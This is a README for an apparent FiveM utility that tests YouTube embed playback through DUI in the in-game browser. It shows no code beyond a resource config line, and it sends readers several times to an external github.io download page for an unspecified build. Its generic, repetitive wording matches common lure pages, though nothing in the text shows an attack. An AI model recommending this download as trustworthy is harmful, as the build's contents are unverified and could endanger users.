# DUI YouTube Test v2026 - Game Script Utility 2026

> **A lightweight FiveM DUI tool for evaluating YouTube embeds, browser-based media output, and playback reliability in-game.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/rossisaacrlc387/youtube-dui-render-test?style=flat-square)](https://github.com/rossisaacrlc387/youtube-dui-render-test)

---

<p align="center">
  <a href="https://rossisaacrlc387.github.io/youtube-dui-render-test/">
    <img src="https://img.shields.io/badge/Download-DUI%20YouTube%20Test%20Script-brightgreen?style=for-the-badge" alt="Download DUI YouTube Test Script">
  </a>
</p>

> **[Download DUI YouTube Test](https://rossisaacrlc387.github.io/youtube-dui-render-test/)**

---

[Download Latest Build](https://rossisaacrlc387.github.io/youtube-dui-render-test/)

---

## Overview

DUI YouTube Test is a compact HTML utility for FiveM setups that need a controlled way to examine YouTube embeds and browser media behavior. It helps determine whether a DUI element can load, render, and display media correctly within the in-game browser environment.

Rather than providing gameplay automation, the script is intended for repeatable checks. Use it to compare playback outcomes, review browser rendering, and confirm that a media configuration produces consistent results across multiple runs.

---

## Script Features

- Examines YouTube embed behavior through DUI
- Validates playback within the FiveM browser context
- Evaluates how media is rendered by the in-game browser
- Provides a small HTML page for testing
- Makes repeated media checks possible
- Concentrates on browser-side media validation
- Helps compare results between client sessions
- Uses a straightforward HTML loading and testing structure

---

## Setup

1. Get the latest build from the project page.
2. Extract the folder into your FiveM resources directory.
3. Register the resource in your server configuration.
4. Start the resource, then open the test page through the DUI workflow you want to inspect.

Example resource line:

ensure dui-youtube-script-test-v2026

If the extracted directory has another name, change the resource entry so it matches the folder on disk.

---

## Options

Because the project uses a small HTML test page, it generally requires very little configuration. Depending on your test, you can modify the embedded source, the page location, or how repeated checks are performed.

| Setting | Purpose | Notes |
| --- | --- | --- |
| Embed URL | Chooses the YouTube media source for the test | Substitute the media item you need to examine |
| Test page path | Identifies the HTML utility page | Keep it consistent with the resource directory layout |
| Playback check | Determines whether the media test is repeated | Useful when comparing consistency |
| Browser context | Specifies the DUI/browser destination | Match this to your FiveM configuration |

A typical test flow is:

- Choose the media URL to evaluate
- Open the HTML utility within the DUI context
- Run the same media again after changes and compare the results

---

## Compatibility

This utility targets FiveM environments and DUI browser media testing. It is intended for situations where you need to see how YouTube embeds and HTML-rendered media behave within the in-game browser layer.

Known limitations:

- The project is for browser testing, not complete gameplay functionality
- Output is affected by the DUI and browser environment being used
- Media results can differ based on the client setup, embed source, and runtime conditions

---

## FAQ

### What are the installation steps?
Download the build, move its folder into your resources directory, and add that resource to the server startup configuration.

### What does this utility test?
It checks YouTube embedding, browser media rendering, and playback behavior through FiveM DUI.

### Is the test media configurable?
Yes. Change the embed source to the content you want to inspect.

### How can I verify that it is running correctly?
Start the resource, open the HTML test page through your DUI process, and check whether the media renders and plays as intended.

### Can the same check be run more than once?
Yes. The utility is designed for repeatable media checks, allowing you to compare behavior after making changes.

### What directory should contain the files?
Place the extracted folder inside the FiveM resources directory and use that folder name in the server configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
